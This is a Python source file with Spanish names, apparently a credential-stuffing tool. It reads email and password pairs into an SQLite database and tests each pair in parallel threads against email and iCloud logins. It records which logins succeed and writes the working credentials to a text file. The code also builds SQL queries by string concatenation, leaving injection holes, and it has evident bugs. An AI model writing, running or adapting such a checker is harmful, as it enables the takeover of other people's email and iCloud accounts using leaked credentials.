import sqlite3
from tools.Pumper import Pumper
from tools.Login import Login
import threading
class refinery:
    def __init__(self,database_file = "refinery.db",archivo_entrada = None):
        self.pumper = Pumper(database_file = database_file,archivo_entrada = archivo_entrada)
        
    def refinar_datos(self):
        return self.pumper.select_datos_all()
    
    def actualizar_checked_email(self,id,checked):
        self.pumper.cursor.execute("UPDATE login SET checkedMail="+str(checked)+" WHERE id='"+id+"'")
        self.pumper.conn.commit()
    
    def actualizar_checked_icloud(self,id,checked):
        self.pumper.cursor.execute("UPDATE login SET checkedIcloud="+str(checked)+" WHERE id='"+id+"'")
        self.pumper.conn.commit()

    def actualizar_datos(self,email,contra,icloud,logmail,checked):
        self.pumper.cursor.execute("UPDATE login SET email='"+email+"' password='"+contra+"', icloud="+icloud+", logmail="+logmail+" checked="+checked+" WHERE id='"+email+contra+"'")
        self.pumper.conn.commit()
    
    def añadir_datos(self,entrada):
        self.pumper.archivo_entrada = entrada
        self.pumper.extraer_datos()
    
    def recuperar_datos_checados_email(self,check):
        return self.pumper.select_datos_checked_mail(check)
    
    def recuperar_datos_checados_icloud(self,check):
        return self.pumper.select_datos_checked_icloud(check)

    
    def recuperar_email_validos(self):
        cuentas = self.pumper.select_datos_logmail(1)
        salida = open("salida_"+self.pumper.database_file+".txt","w")        
        for cuenta in cuentas:
            salida.write("email: {0} contraseña: {1}\n".format(cuenta[1],cuenta[2]))
            print("email: {0} contraseña: {1}".format(cuenta[1],cuenta[2]))
        print("son todos")
        salida.close()
    
    def recuperar_icloud_validos(self):
        return self.pumper.select_datos_icloud(1)
    
    def checar_emails_login(self,hilos):
        logins = self.recuperar_datos_checados_email(0)
        for login in logins:
            thread = threading.Thread(target=self.checar_email_login_hilo,args=(login,))
            thread.start()
            while threading.active_count() >= hilos:
                pass
        thread.join()
    
    def checar_icloud_login(self,hilos):
        logins = self.recuperar_datos_checados_icloud(0)
        for login in logins:
            thread = threading.Thread(target=self.checar_icloud_login_hilo,args=(login,))
            thread.start()
            while threading.active_count() >= hilos:
                pass
        thread.join()
    
    def checar_email_login_hilo(self,login):
        try:
            logged = Login(email=str(login[1]),contra=str(login[2]))
            if logged.checkLoginEmail():
                        self.actualizar_logmail(1,login[0])
                        print("Exito: {0} {1}".format(login[1],login[2]))
            else:
                self.actualizar_logmail(0,login[0])
                print("No exito: {0} {1}".format(login[1],login[2]))
            self.actualizar_checked_email(login[0],1)
        except:
            print("Error: {0}".format(login))

    def checar_icloud_login_hilo(self,login):
        try:
            logged = Login(login[1],login[2])
            if logged.checkLoginiCloud():
                self.actualizar_icloud(1,login[0])
                print("Exito: {0} {1}".format(login[1],login[2]))
            else:
                self.actualizar_icloud(0,login[0])
                print("No exito: {0} {1}".format(login[1],login[2]))
            self.actualizar_checked_icloud(login[0],1)
        except:
            print("Error: {0}".format(login))



    def actualizar_logmail(self,logmail,id):
        self.pumper.cursor.execute("UPDATE login SET logMail='"+str(logmail)+"' WHERE id='"+id+"'")
        self.pumper.conn.commit()

    def actualizar_icloud(self,icloud,id):
        self.pumper.cursor.execute("UPDATE login SET icloud='"+str(icloud)+"' WHERE id='"+id+"'")
        self.pumper.conn.commit()


if __name__ == "__main__":
    refinery = refinery()
    refinery.checar_emails_login()
    